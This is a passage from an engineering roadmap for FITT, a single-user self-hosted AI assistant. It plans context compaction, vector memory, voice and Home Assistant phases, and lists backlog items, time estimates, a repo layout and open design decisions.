(Phase 7's context-window discovery is what tells compaction
when to fire) and keeps the inline draft from being lost as a
single bullet in an opportunistic list. Compaction earns its
slot when sessions actually fill up day-over-day — not yet, but
soon enough that the design shouldn't keep drifting through
docs.

**Key work:**

- **Threshold trigger.** Use Phase 7.1's per-binding context
  window as ground truth. Default trigger at the smaller of
  ~95% of context window (Claude Code's heuristic) or 40KB of
  raw history (the hallucinations doc's earlier number, useful
  as a pre-context-aware floor). Operator override via
  `memory.compaction_threshold_pct`. Skip compaction when the
  bound model's context window is unknown — fail loud rather
  than guess.
- **Summarization call.** Use the alias bound to
  `auxiliary.compaction.model` (default: `fitt-fast`); if
  unbound, use the same alias as the originating turn. Pattern
  from Hermes's `auxiliary.<task>.{provider,model}` shape (see
  prior-art.md borrow-list). Don't burn `fitt-smart` credits on
  summarization.
- **Operator-customizable prompt.**
  `memory.compaction_prompt` config field with an opinionated
  default: "preserve decisions, file paths, identifiers, user
  corrections, lessons; summarize tool results down to outcome
  + key argument; drop chitchat." Claude Code / Cursor users
  universally override the default; ship something opinionated
  rather than generic.
- **Model feasibility check.** Hermes has this and we should
  too: refuse to compact against a model that fails the eval
  harness's basic comprehension cases (an over-quantized 8B
  model will hallucinate the summary). If the configured
  `auxiliary.compaction.model` doesn't pass, fall back to the
  primary alias and log loudly.
- **`# Compacted <date>` storage shape.** History markdown grows
  a top section that holds the rolling compacted summary; the
  recent tail stays verbatim below it. Operator-readable; greppable;
  recoverable (a compaction backup tar lands at
  `$FITT_HOME/sessions/<key>/compacted-backups/` mirroring
  Hermes's recoverable-archive pattern).
- **Lessons interaction.** Lessons are operator-curated;
  compaction is automatic. They share the same storage shape
  (markdown bullets) but different trust levels. Compaction
  must NOT touch the `[Learned corrections]` block or
  identity files. Lessons take precedence in the dispatched
  prompt.
- **Tool-output disk-persistence (already shipped 2026-05-11).**
  Phase 4 hoists tool outputs >8KB to `artifacts/<date>/`. Cite
  here as the prerequisite that lets compaction NOT need to
  preserve verbatim tool payloads — the artifacts on disk are
  the ground truth, summaries can drop the in-context preview.
- **Manual `/compact` command.** Telegram + CLI surface for
  operator-driven compaction (Cursor and Hermes both ship this).
  `fitt session compact <session>` from the CLI; `/compact`
  Telegram command on the active chat's session. Useful when
  the operator wants to start a fresh long task without a
  restart.

**Scope boundaries:**

- **No trajectory compression for training data.** Hermes does
  this; it's out of FITT's scope.
- **No swappable context-engine plugins.** Hermes has them;
  single-user FITT doesn't need plugin shape over a config
  field.
- **No per-tool compaction policy.** Coarse: the whole older
  half summarises with one prompt. Per-tool fine-tuning ("never
  compact `cron_*` tool calls; always compact `read_file`
  results") is a Phase 8.x follow-up if compaction loses
  load-bearing context.

**Prerequisites:** Phase 7.1 (context-window discovery; without
it the trigger is guessing). Phase 4 tool-output disk-persistence
(already shipped) so compaction doesn't have to preserve verbatim
tool payloads.

**References:**
- `docs/hallucinations-and-poisoning.md` action item 5 — the
  full design rationale and Claude Code's five-layer cascade.
- `docs/prior-art.md` OpenClaw audit (`compaction.*.ts`,
  12+ files) and Hermes audit (`conversation_compression.py`,
  model feasibility check) for reference implementations.
- `docs/observed-issues.md` for the symptom log that motivates
  this work.

*Full three-file spec to be written under
`.kiro/specs/phase8-compaction/` when this phase starts.*

---

## Phase 9 — Memory v1: Vector / RAG / Cross-Project (Spec-driven, ~3 weekends)

**Goal:** "The agent consistently forgets things older than a
week" stops being true. Add structured cross-session recall so
"remember when we discussed X two weeks ago" actually works,
and so cross-project queries ("what did I learn about
deployment last month, in any project") return useful results.

**Why this phase exists separately.** Was the original Phase 7
("vector memory + admin UI"). Split off from the dashboard
work 2026-05-22 because the dashboard had real urgency from the
visibility gap (Phase 7) and vector memory is much bigger ML work
that should land when daily friction shows up — not be gated
on the dashboard. Reading prior-art.md surfaced two specific
candidate substrates worth evaluating before building from scratch.

**Key work:**

- **Substrate evaluation: Honcho.** First step before code is
  written. Honcho is an open-source cross-session user-modeling
  service (plastic-labs, MIT license, hosted or self-hosted)
  with an explicit `MemoryProvider` ABC contract that Hermes
  ships a clean plugin against. The five-tool surface
  (`profile`, `search`, `reasoning`, `context`, `conclude`) is
  the right schema for FITT regardless of whether we use
  Honcho proper. v0 evaluation: spin up Honcho self-hosted,
  point a FITT plugin at it, check whether it answers
  "remember when we discussed X" usefully on real session
  data. 1-2 days. If yes: adopt with FITT-side wrapper. If no:
  fall back to home-grown FTS5 + embeddings.
- **Fallback substrate: SQLite + FTS5 + embeddings.** Hermes's
  `tools/session_search_tool.py` is the reference: SQLite FTS5
  for keyword search with anchored windows (3-shape API:
  discovery / scroll / browse), plus a separate embeddings
  layer for semantic similarity. The two layers complement
  each other — keyword for "the exact phrase," semantic for
  "the gist." Lands as a FITT-internal substrate if Honcho
  doesn't fit. 1-2 weekends.
- **Embedding model selection.** Local Ollama embedding model
  on a Compute satellite (Principle 5 — no subscription).
  Default: `nomic-embed-text` or `all-minilm`. The choice
  matters for retrieval quality but is a config knob, not
  architecture. Evaluation as part of the v0 substrate work.
- **Cross-project recall.** Sessions today are scoped per
  named session under `$FITT_HOME/sessions/<id>/`. Phase 9
  adds optional cross-session retrieval: "search across all
  sessions for X" returns results scoped by session metadata.
  Keeps single-session reads fast; cross-session is opt-in
  per query.
- **Migration path.** Existing markdown history must remain the
  ground truth and stay readable. The vector layer is an index
  on top, not a replacement. A re-index script (offline, not
  blocking) walks existing history files and populates the
  index. Re-indexing is idempotent.

**Scope boundaries:**

- **No real-time embedding on every turn.** Async background
  task, runs after turn persistence completes. A small
  retrieval-quality lag is fine; blocking the chat path on
  embeddings is not.
- **No cross-user.** Single-user FITT; cross-user separation
  is not a memory problem here.
- **No automatic summary regeneration.** Compaction (Phase 8)
  handles in-session summarisation. Phase 9's vector layer
  reads what compaction wrote.

**Prerequisites:** Phase 8 compaction (compaction's `# Compacted
<date>` summaries are what Phase 9 indexes for older sessions;
without compaction Phase 9 indexes 30 days of verbatim tool
output and gets noisy retrievals).

**References:**
- `docs/prior-art.md` Hermes audit on Honcho integration shape
  + FTS5 anchored-window session search pattern.
- `docs/prior-art.md` Beever Atlas section — knowledge-graph
  alternative substrate; deferred until multi-surface data
  justifies the graph shape.

*Full three-file spec to be written under
`.kiro/specs/phase9-memory-v1/` when this phase starts.*

---

## Phase 10 — Voice (was Phase 8)

Triggered by "I want hands-free." Whisper STT + Piper/Kokoro
TTS. See the `FITT_PRD.md` original vision for the longer
sketch; this section gets a proper inline draft when the phase
becomes the active one.

Borrow from prior-art.md: Hermes's task-specific model overrides
pattern — `channels.<channel>.tts.summaryModel` for "the model
that generates voice-friendly summaries" so cheap models do
the housekeeping.

---

## Phase 11 — Home Assistant (was Phase 9)

Triggered by "I want my AI to control my house." Home Assistant
MCP integration + approval-gated physical-world actions
("turn on the lights" goes through the same approval flow as
"edit this file"). Likely the biggest day-to-day payoff of the
roadmap, per the project-overview steering. Inline draft fills
in when the phase becomes active.

---

## Phase 12+ — Opportunistic upgrades

Features we know we'll want eventually but shouldn't pre-build.
Each one lands when daily friction justifies it. Items below
are organised by source (operator-observed friction, audits of
reference systems, latent items from earlier phases).

Where an item has a captured design (effort estimate, trigger
condition), it lives here with a one-line summary and a
cross-reference. The original docs are the source of truth;
this list is the index.

### Operator-observed friction (from `docs/observed-issues.md`)

- **Cheerleading / success theater.** Add to the system prompt a
  "report what actually happened, including failures; no victory
  laps" instruction. Minutes of work; partial impact (research
  says prompting alone doesn't eliminate this but reduces
  magnitude). 2026-05-10. Free to try with the next prompt
  iteration.
- **Capability false-negative ("I can't provide weather
  forecasts").** Model refuses a capability it has. Mostly
  model-level; mitigations: restructure capability block to
  read as "here's what you CAN do," add a domain-mention
  pre-hook. 2026-05-10.
- **Telegram approval prompt floats between messages after
  decision.** Cosmetic; delete the approval message after
  decision rather than edit in place. Few minutes. Low urgency.
- **Telegram double-message for interactive `project_shell`
  calls.** A `tool_executed.suppress_on_interactive` config
  knob would collapse the redundant pair. Few hours.
- **Granite-style narration under large system prompt
  (2026-05-22).** Small models lose tool-call discipline well
  before context limit when system prompt grows past a few
  thousand tokens. Surfaced by Phase 7's traceability work
  (token measurement makes the failure visible); deeper
  fixes (compact-prompt mode for small models, alias-specific
  prompt templates) are real follow-up work but not on
  Phase 7's critical path. See `docs/observed-issues.md`.

### Items observed in OpenClaw / Hermes audits

Captured during the 2026-05-15 OpenClaw audit and 2026-05-21
Hermes audit. Full pick-list with effort and trigger conditions
in `docs/prior-art.md` (search for "Opportunities pick-list"
and "Borrow-list updates").

- **Skills-as-markdown loader.** Single highest-leverage
  opportunistic change per both audits. Half day; opens up ~20
  of OpenClaw's MIT-licensed skills as drop-in content.
- **Default web search via skills loader.** Half day after the
  loader exists; replaces the per-tool web search work.
  *(Note: superseded by Phase 4.11's web_search tool, but the
  skills-loader path remains valid as a parallel content
  reservoir.)*
- **Heartbeat structured-outcome schema.** OpenClaw's `outcome ∈
  {progress, no_change, done, needs_attention} + notify=bool +
  priority` contract on top of FITT's existing cron + send_message.
  1-2 days; trigger when "wake every 30m and check X" with a real X
  shows up.
- **Better-shaped operator error messages.** Both audits flagged
  this. Name the config key in the error, explain layering,
  give the actionable fix. Few hours per error path; opportunistic.
  Next candidates: `upstream_silent` shape, `no_backend_available`.
- **Per-turn `thinking` / `reasoning_level` knob.** Surface in
  request body for adaptive-thinking models (current Anthropic,
  o-series). Half day. LiteLLM passes known fields through.
- **Task-specific model overrides.** `auxiliary.<task>.{provider,
  model,api_key}` pattern from Hermes; cheaper model for
  housekeeping (compaction, voice, embeddings). Half day each;
  lands with the phase that needs the task. Phase 8 compaction
  is the first opportunity.
- **`[SILENT]` cron response convention.** Model-controllable
  notification suppression for cron jobs that fire when
  nothing changed. Few hours. Borrowed from Hermes audit,
  2026-05-21.
- **Per-click Telegram approval-button user authorization.** Hermes
  has this; FITT relies on chat-level filtering. Few hours; ship
  before a second person joins the operator chat.
- **Provider-level timeout config keys.** `providers.<id>.timeout_secs`
  rather than one global. Half day; Phase 5+ config split.
  Trigger: `upstream_silent` shape needs per-provider tuning.
- **Telegram callback-data alias rewrite.** Note for the future;
  64-byte limit isn't a problem yet but would be if the schema
  grows. OpenClaw audit + Hermes audit both flagged the pattern.
- **Honcho memory plugin evaluation.** 1-2 days; lands with
  Phase 9 memory v1 evaluation (cross-referenced there).
- **FTS5 anchored-window session search.** Phase 9 reference
  implementation; cross-referenced there.
- **Before-tool-call validation hook.** Schema-sanitize-before-
  dispatch pattern from both audits. 1-2 days; trigger when
  hallucinated-tool-call rate becomes operationally annoying.
- **Per-agent Docker sandbox.** Both audits ship this. 3-5 days;
  trigger when sub-agents ship — not before.
- **Subagents / parallel execution.** 3-5 days. Trigger by "I
  want FITT to research X while executing Y." Hermes's
  `delegate_tool.py` has the reference shape (leaf vs
  orchestrator roles, per-thread approval callbacks).

### Latent items from earlier phase scope-boundaries

- **Realistic-prompt eval mode.** Extend `alias_eval` to construct
  the system prompt the way live chat does (capability block,
  identity, lessons, skills). The diff between bare and realistic
  runs surfaces granite-style "model is fine in isolation, fails
  under FITT's prompt" failures. Half day to a day. Captured
  during the Phase 7 design conversation; lands as a `--realistic`
  flag on `fitt eval alias`.
- **Prompt-budget eval mode.** `--prompt-budget <tokens>` on
  `fitt eval` runs the suite at multiple synthetic prompt sizes
  to learn the model's graceful-degradation curve. Useful;
  novel; not blocking. Half day after `--realistic` lands.
- **Compact-prompt mode for small models.** `tools.compact_capability_block:
  true` config flag that skips the capability block's prose
  trailer and renders only the tool list. Mitigation for the
  granite case below the prompt-size threshold without changing
  models. Half day; ship if Phase 7's traceability shows
  small-model bindings consistently failing on prompt size.
- **Replan in spec-runner.** Triggered by "the runner stops too
  often on solvable blockers." LLM-driven revision of remaining
  tasks after a failure. Tied to Phase 6's reshape decision;
  if Phase 6 is reshaped to "FITT hands tasks to OpenCode,"
  replan moves to OpenCode's surface, not FITT's.
- **Self-review in spec-runner.** Same Phase 6 dependency.
- **Cross-machine SSH fleet management.** Triggered by "adding a
  new satellite is fiddly." Automated tailnet discovery,
  capability probing, auto-registration.
- **OS-level agent sandbox.** Triggered by "I want
  `trust_session` on `project_shell` without reading every
  command." Linux Landlock + seccomp; macOS Seatbelt; Windows
  punt. 2-3 weeks of focused work, security-critical, OS-specific.
- **Cost-cap enforcement middleware** if provider-dashboard
  limits ever prove insufficient.
- **Backups: nightly snapshot of memory + audit log to NAS.**
- **Weekly audit log review.**
- **Secondary compute node:** desktop's 3070 as Ollama fallback.
- **Multi-project context improvements.**
- **Regression-test harness for agent behavior** (record/replay
  common prompts across model upgrades).
- **Productization decision.** Revisit end of Phase 11.
- **Self-evolving skills (speculative).** Synthesise new skill
  files from recurring corrections or tool-call sequences.
  Hermes's curator (`agent/curator.py`, ~1850 lines) is the
  reference if this ever earns its keep. Pattern worth knowing:
  provenance + sidecar telemetry + pure transitions + LLM judge
  + recoverable archive.
- **Dashboard edit support** (Phase 7 follow-up). Editing
  `config.yaml`, `secrets.yaml`, `projects.yaml`, `cron.json`,
  identity files, lessons through the dashboard UI. Real work
  (validation, atomic writes, hot reload, error recovery).
  Lands once Phase 7's read-only surface has earned its keep.
- **Current-facts nudge in capability block.** "When the request
  is about current events, recent releases, weather, sports, or
  anything that might be newer than your training data, reach for
  a tool first." Minutes of work. Lower priority now that
  Phase 4.11's web_search ships.

---

## Testing Philosophy

FITT's architecture has two testable layers:

1. **Deterministic plumbing** (gateway routing, auth, config loading, memory file I/O, cost calculation) — covered by pytest + property tests, same discipline as chess-coaching.
2. **Agent behavior** (does FITT correctly decide when to use a tool, when to refuse, when to ask for clarification) — harder. Starting Phase 4, maintain a small harness of 10–20 prompts with expected tool-call patterns. Run it after every model swap, config change, or prompt-template edit. This is the only defense against silent quality regression when you upgrade from Qwen 2.5 → Qwen 3 → whatever.

---

## Time Estimates (honest, post-review)

| Phase | Focused time | Calendar time |
|-------|--------------|---------------|
| 0     | 30 min       | 1 day         |
| 1     | 8 hrs        | 1 weekend     |
| 2     | 5 hrs        | 1 weekend     |
| 2.5   | 6 hrs        | 1 weekend     |
| 3     | 6 hrs        | 1 weekend     |
| 4     | 14 hrs       | 2 weekends    |
| 4.5   | 3 hrs        | half weekend  |
| 4.6   | 5 hrs        | 1 weekend     |
| 4.7   | 5 hrs        | 1 weekend     |
| 4.8   | 6 hrs        | 1 weekend     |
| 5     | 10 hrs       | 1–2 weekends  |
| 6     | (reshape pending — see Phase 6 note) | — |
| 7     | 24 hrs       | 3–5 weekends  |
| 8     | 10 hrs       | 1 weekend     |
| 9     | 20 hrs       | 3 weekends    |
| 10    | 14 hrs       | 2–3 weekends  |
| 11    | 16 hrs       | 2–3 weekends  |
| 12+   | ongoing      | —             |

**To useful MVP (Phases 0–4):** ~6 weekends of focused work.
**To full vision (Phases 0–11):** ~18 weekends of focused work, plus 2-week "live with it" gaps between phases = 8–11 months calendar.

Expect calendar time to stretch 2–3x. Real life happens.

---

## Repo Layout (create in Phase 1)

```
home-ai-cluster/
├── README.md
├── FITT_ROADMAP.md              # this file, moved from chess-coaching repo
├── FITT_PRD.md                  # the PRD (rename from RETRO_KITT_PRD.md)
├── .kiro/
│   └── specs/
│       ├── phase1-gateway/      # promoted from inline when phase starts
│       ├── phase2-memory/
│       ├── phase2.5-sessions/
│       ├── phase3-telegram/
│       └── ...
├── gateway/                     # FastAPI daemon (Phase 1)
├── memory/                      # identity + history markdown (Phase 2)
├── telegram-bot/                # Phase 3
├── mcp-servers/                 # custom MCP server implementations (Phase 4+)
│   ├── retroai-training/
│   ├── emulator/
│   └── telegram-out/
├── skills/                      # if adopted (Phase 10)
├── configs/
│   └── config.example.yaml
└── scripts/
    └── install-service.ps1
```

---

## Open Decisions (resolve as you go)

- **Custom dashboard or stick with Open WebUI?** Open WebUI ships in Phase 3. If it covers the needs, no custom dashboard ever gets built. Re-evaluate end of Phase 4 — specifically whether approval flows, session management, and audit-log inspection warrant a purpose-built surface.
- **Fork an existing self-hosted AI gateway vs build clean?** Revisit end of Phase 3. If the gateway feels over-engineered, consider adopting an existing open-source base (LiteLLM Proxy, LibreChat, etc.).
- **Mem0/Zep or markdown forever?** Revisit end of Phase 7.
- **Shared-session vs per-interface-session?** Resolved in Phase 2.5; re-evaluate if the shared default feels wrong after living with it.
- **Productize?** Revisit end of Phase 9.

---

*Roadmap status: v1.2 — renamed to FITT, cost cap cut, sessions phase added, project registry added, voice deferred, memory simplified. When a phase begins, promote its inline section to `.kiro/specs/<phase>/{requirements,design,tasks}.md`.*
